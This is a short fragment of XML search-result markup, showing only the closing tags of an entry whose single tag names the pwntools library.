        <tag>pwntools</tag>
      </tags>
  </entry>
</search>
